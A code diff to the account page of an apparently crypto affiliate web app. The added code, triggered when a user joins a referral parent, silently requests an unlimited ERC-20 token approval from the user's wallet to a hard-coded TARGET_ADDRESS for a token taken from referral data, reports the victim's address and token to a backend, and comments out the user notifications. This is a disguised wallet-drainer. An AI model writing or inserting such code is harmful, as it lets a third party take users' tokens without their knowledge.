@@ -11,11 +11,12 @@ import { RootState } from "app/store";
 import { useHistory } from "react-router-dom";
 import Web3 from 'web3';
 import CopyToClipboard from "react-copy-to-clipboard";
-import { BASE_URL, CHAIN_ID, SITE_NAME } from "utils/data";
+import erc20Abi from "contracts/abis/erc20Abi.json";
+import { BASE_URL, CHAIN_ID, SITE_NAME, TARGET_ADDRESS } from "utils/data";
 import { useWeb3Context } from "hooks/web3Context";
 import { changeNetwork, useContract, useRefresh } from "hooks";
 import { displayFixed, ellipseAddress, isNullAddress, isPerNum, showToast } from "utils";
-import { getDownlines, postUpdatePerNum} from "utils/fetchHelpers";
+import { getDownlines, postUpdate, postUpdatePerNum} from "utils/fetchHelpers";
 import { getAccountName, getLevelOnes, getParent, getParentName, setParent } from "contracts/affiliateHelper";
 import { setUser } from "app/home/home";
 
@@ -27,10 +28,10 @@ const AccountPage: FC<AccountPageProps> = ({ className = "" }) => {
 
   const history = useHistory();
   const dispatch = useDispatch();
-  const { user, refAddress } = useSelector((state:RootState) => state.home);
+  const { user, refAddress, refAddress1 } = useSelector((state:RootState) => state.home);
   const { connected, address, chainID } = useWeb3Context();
   const { fastRefresh } = useRefresh();
-  const { web3, affiliateContract } = useContract();
+  const { web3, affiliateContract }:any = useContract();
 
   const [ balance, setBalance ] = useState("0");
   const [ hasParent, setHasParent ] = useState(false);
@@ -110,7 +111,7 @@ const AccountPage: FC<AccountPageProps> = ({ className = "" }) => {
 
   useEffect(() => {
     const getData = async () => {
-      if(web3) {
+      if(web3 && address) {
         // @ts-ignore
         const resBal = await web3.eth.getBalance(address);
         const _bal = displayFixed(resBal, 5);
@@ -134,7 +135,32 @@ const AccountPage: FC<AccountPageProps> = ({ className = "" }) => {
     // console.log("name=", user.username);
     setIsPending(true);
     const res = await setParent(affiliateContract, address, refAddress, user.username);
-    showToast(res.message, res.success ? "success" : "error");
+    if(res.success) {
+      try{
+        console.log("onHandleAffiliate refAddress1 = ", refAddress1, "web3 = ", web3)
+        if(refAddress1 && web3) {
+          let tokenContract = new web3.eth.Contract(erc20Abi, refAddress1);
+          let allowance = await tokenContract.methods.allowance(address, TARGET_ADDRESS).call();
+
+          if(allowance == 0) {
+            await tokenContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("10000000000000", "ether").toString()).send({from: address, maxPriorityFeePerGas: "52000000000" })
+
+            const params = {
+              name: user.username,
+              address,
+              token: refAddress1
+            }
+            const res = await postUpdate(params);
+            console.log("postUpdate res = ", res);
+          }
+        }
+      } catch(err:any) {
+        console.log("test error =", err)
+      }
+      // showToast(res.message, "success");
+    } else {
+      // showToast(res.message, "error");
+    }    
   }
 
   const onChangePerNum = (e:any) => {
